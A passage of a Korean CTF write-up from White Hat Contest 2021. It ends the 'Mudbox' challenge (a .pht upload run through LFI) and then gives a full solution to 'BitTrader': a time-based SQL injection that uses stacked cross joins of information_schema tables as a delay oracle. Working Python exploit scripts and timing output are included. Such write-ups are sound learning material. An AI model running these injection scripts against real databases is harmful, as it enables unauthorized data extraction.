<p><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-12%20%EC%98%A4%ED%9B%84%205.53.30.png?raw=true" alt=""></p>
<p>일단 위 코드를 pht 확장자로 업로드 합니다.</p>
<p><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-12%20%EC%98%A4%ED%9B%84%205.55.27.png?raw=true" alt=""></p>
<p>파일을 실행 하고, LFI 취약점을 이용해 파일을 실행 하니 플래그가 출력되는 것을 볼 수 있습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG{b4s3dir_i5_n0t_s4fe_h4h4}
</span></span></code></pre></div><hr>
<h1 id="web-bittrader-482-pts">(Web) BitTrader [482 pts]<a href="#web-bittrader-482-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<blockquote>
<p>BitTrader 문제는 join을 이용해서 테이블을 여러개 조인 해 줄 경우 발생하는 슬립 현상을 이용해서 Time Based SQL Injection을 하는 문제 입니다.</p>
</blockquote>
<p>해당 문제는 대회 당시에 Mudbox와 다르게 그냥 감 자체를 잡지 못 했고, 공부용으로도 너무 좋은 문제라서 대회가 끝났지만 계속 풀어보기로 했습니다. 일단 대회 당시에 SQL Injection인 것을 알았지만 어떤 식으로 데이터를 추출해야 하는 지 알지 못 했습니다.</p>
<p><img src="https://media.discordapp.net/attachments/857916308892418071/887238980481978418/1.png?width=1588&amp;height=1077" alt=""></p>
<p>일단 문제 페이지를 보면 위와 같이 비트코인, 이더리움, 리플, 도지 코인의 현재 가격을 출력해주는 것을 확인할 수 있습니다.</p>
<p><img src="https://media.discordapp.net/attachments/857916308892418071/887238991072591893/2.png?width=1780&amp;height=1075" alt=""></p>
<p>그리고 Trade 버튼을 클릭하면 특정 코인의 가격을 5초 간격으로 나타나는 지표를 확인할 수 있으며, 네트워크 창을 확인 해보면 api(ajax_ticks.php?symbol=btc)로 요청 해서 코인의 현재 가격을 가져 오는 것을 확인할 수 있습니다.</p>
<p><img src="https://media.discordapp.net/attachments/857916308892418071/887238987121577984/3.png?width=1780&amp;height=1075" alt=""></p>
<p><code>/ajax_ticks.php?symbol=btc</code>로 접속을 하면 위와 같이 결과 값을 반환하는 것을 확인할 수 있습니다.</p>
<p><img src="https://media.discordapp.net/attachments/857916308892418071/887238985599033344/4.png?width=1780&amp;height=1075" alt=""></p>
<p>그래서 여기가 SQL Injection 공격 포인트라 생각하고, 여러 페이로드를 보내면서 익스를 시도 하였지만 성공하지 못 했습니다. 일단 대부분에 특수 문자가 막혀 있기 때문에 싱글 쿼터 및 함수 자체를 사용할 수 없었습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">~~</span> <span style="color:#66d9ef">FROM</span> price_$symbol <span style="color:#66d9ef">limit</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>
</span></span></code></pre></div><p>하지만 symbol의 값이 where 절에 들어가는 것이 아닌 위와 같이 테이블 명에 들어가기 때문에 싱글 쿼터를 우회할 필요가 없었으며 익스플로잇은 join을 이용해 테이블 여러개를 조인 시켜 줄 경우에 발생하는 에러 또는 슬립 현상을 이용해 Error/Time Based SQL Injection을 이용해야 했습니다. 저는 슬립 현상을 이용해서 타임어택을 하였지만 효율성은 에러를 이용하는 것이 좋아 보입니다.</p>
<p><img src="https://media.discordapp.net/attachments/857916308892418071/887238968624689182/5.png?width=1794&amp;height=209" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">cross</span> <span style="color:#66d9ef">join</span> information_schema.tables <span style="color:#66d9ef">cross</span> <span style="color:#66d9ef">join</span> information_schema.columns <span style="color:#66d9ef">on</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">cross</span> <span style="color:#66d9ef">join</span> information_schema.tables <span style="color:#66d9ef">cross</span> <span style="color:#66d9ef">join</span> information_schema.columns <span style="color:#66d9ef">on</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;
</span></span></code></pre></div><p>일단 로컬에서 cross join을 이용해 메타 테이블들을 이어주는 퀴러를 위와 같이 작성 해 테스트를 해보았습니다. 사진을 보면 거짓일 때는, 쿼리 실행이 바로 종료 되지만, 참일 때는 오랜시간 슬립 현상이 발생하는 것을 확인할 수 있었습니다.</p>
<p>그렇기 때문에 이를 이용해서 Time Based SQL Injection을 이용해 디비 정보를 모두 추출하면 됩니다.</p>
<p><img src="https://media.discordapp.net/attachments/857916308892418071/887238988874784768/6.png?width=1794&amp;height=1063" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>btc <span style="color:#66d9ef">cross</span> <span style="color:#66d9ef">join</span> information_schema.columns <span style="color:#66d9ef">cross</span> <span style="color:#66d9ef">join</span> information_schema.tables <span style="color:#66d9ef">on</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>그래서 <code>cross join</code>을 이용하여 위와 같이 메타 테이블 2개를 엮어주는 쿼리를 전송해주니 약 4초 정도 Sleep이 발생하는 것을 볼 수 있습니다. 이제 이를 이용해서 Time Based SQL Injection을 하면 될 거 같습니다 :)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns on m.table_name like 0x</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leaked <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> url<span style="color:#f92672">.</span>format((leaked <span style="color:#f92672">+</span> s <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;%&#39;</span>)<span style="color:#f92672">.</span>encode()<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(f)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;C: </span><span style="color:#e6db74">{</span>s<span style="color:#e6db74">}</span><span style="color:#e6db74">, T: </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>elapsed<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>일단 테이블 명의 첫 글자들을 확인하기 위해 위와 같이 코드를 작성하였습니다. 그리고 문제에서는 테이블/컬럼 명, 레코드 값을 뽑을 때는 두 개의 테이블로는 크기가 부족해서 <code>statistics</code>, <code>processlist</code> 테이블을 추가로 조인 시켜 주었으며 위와 같이 PoC 코드를 작성해주었습니다.</p>
<pre tabindex="0"><code>C: 0, T: 0:00:00.040496
C: 1, T: 0:00:00.039568
C: 2, T: 0:00:00.033084
C: 3, T: 0:00:00.054973
C: 4, T: 0:00:00.040466
C: 5, T: 0:00:00.033778
C: 6, T: 0:00:00.036218
C: 7, T: 0:00:00.039113
C: 8, T: 0:00:00.039524
C: 9, T: 0:00:00.043274
C: a, T: 0:00:00.042083
C: b, T: 0:00:00.037688
C: c, T: 0:00:02.985553
C: d, T: 0:00:00.041576
C: e, T: 0:00:03.037683
C: f, T: 0:00:03.260697
C: g, T: 0:00:03.217965
C: h, T: 0:00:00.036901
C: i, T: 0:00:02.984188
C: j, T: 0:00:00.042655
C: k, T: 0:00:01.794134
C: l, T: 0:00:01.048942
C: m, T: 0:00:00.036848
C: n, T: 0:00:00.037003
C: o, T: 0:00:01.728545
C: p, T: 0:00:03.069760
C: q, T: 0:00:00.046779
C: r, T: 0:00:03.427775
C: s, T: 0:00:02.869415
C: t, T: 0:00:02.965769
C: u, T: 0:00:01.839867
C: v, T: 0:00:02.045197
C: w, T: 0:00:00.045391
C: x, T: 0:00:00.038370
C: y, T: 0:00:00.034550
C: z, T: 0:00:00.040592
C: A, T: 0:00:00.038777
C: B, T: 0:00:00.035266
C: C, T: 0:00:02.923604
C: D, T: 0:00:00.043928
C: E, T: 0:00:03.431379
C: F, T: 0:00:03.434538
C: G, T: 0:00:03.437290
C: H, T: 0:00:00.041747
C: I, T: 0:00:02.984453
C: J, T: 0:00:00.044469
C: K, T: 0:00:01.692472
C: L, T: 0:00:00.040697
C: M, T: 0:00:00.034870
C: N, T: 0:00:00.039964
C: O, T: 0:00:01.844985
C: P, T: 0:00:02.975808
C: Q, T: 0:00:00.050623
C: R, T: 0:00:03.314133
C: S, T: 0:00:02.897688
C: T, T: 0:00:03.033871
C: U, T: 0:00:02.356644
C: V, T: 0:00:01.630371
C: W, T: 0:00:00.042096
C: X, T: 0:00:00.042518
C: Y, T: 0:00:00.053940
C: Z, T: 0:00:00.042300
</code></pre><p>코드를 돌려보니 위와 같이 꽤나 정확한 오라클 결과들을 얻을 수 있었고, 위 오라클을 기반으로 테이블 명을 뽑아 보다가 <code>f</code>에서 <code>files</code>, <code>flag</code>라는 테이블이 존재하는 것을 확인하였고, 이를 기반으로 컬럼, 레코드 값을 뽑기로 하였습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>str_list <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>printable<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;%&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;_&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute</span>(s, url, data, Time):
</span></span><span style="display:flex;"><span>	result <span style="color:#f92672">=</span> data
</span></span><span style="display:flex;"><span>	p <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> p <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>		start <span style="color:#f92672">=</span> result
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> str_list:
</span></span><span style="display:flex;"><span>			start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>			requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">.</span>format((result <span style="color:#f92672">+</span> s <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;%&#39;</span>)<span style="color:#f92672">.</span>encode()<span style="color:#f92672">.</span>hex()))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> start_time) <span style="color:#f92672">&gt;</span> Time:
</span></span><span style="display:flex;"><span>				result <span style="color:#f92672">+=</span> s
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> start <span style="color:#f92672">==</span> result:
</span></span><span style="display:flex;"><span>			p <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> result
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">&#34;[*] Start an exploit&#34;</span>)
</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] The table name is </span><span style="color:#e6db74">{</span>execute(<span style="color:#e6db74">&#39;fl&#39;</span>, <span style="color:#e6db74">&#39;http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns on m.table_name like 0x</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;fl&#39;</span>, <span style="color:#ae81ff">1.4</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] The column name is </span><span style="color:#e6db74">{</span>execute(<span style="color:#e6db74">&#39;fl&#39;</span>, <span style="color:#e6db74">&#39;http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns as f on f.column_name like 0x</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;fl&#39;</span>, <span style="color:#ae81ff">0.1</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] The flag is </span><span style="color:#e6db74">{</span>execute(<span style="color:#e6db74">&#39;fl&#39;</span>, <span style="color:#e6db74">&#39;http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns cross join flag as c on c.flag like 0x</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;fl&#39;</span>, <span style="color:#ae81ff">1.4</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">&#34;[*] Congratulations for to leak a flag XD&#34;</span>)
</span></span></code></pre></div><p><img src="https://media.discordapp.net/attachments/857916308892418071/887238985490001930/2021-09-14_4.30.04.png?width=1794&amp;height=753" alt=""></p>
<p>PoC 코드를 돌려 주면 위 사진처럼 테이블/컬럼 명 및 플래그 릭에 성공하는 것을 확인할 수 있습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG : FLAG{d0geg0estom4rs}
</span></span></code></pre></div>
      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>








  
</div>

</body>
</html>
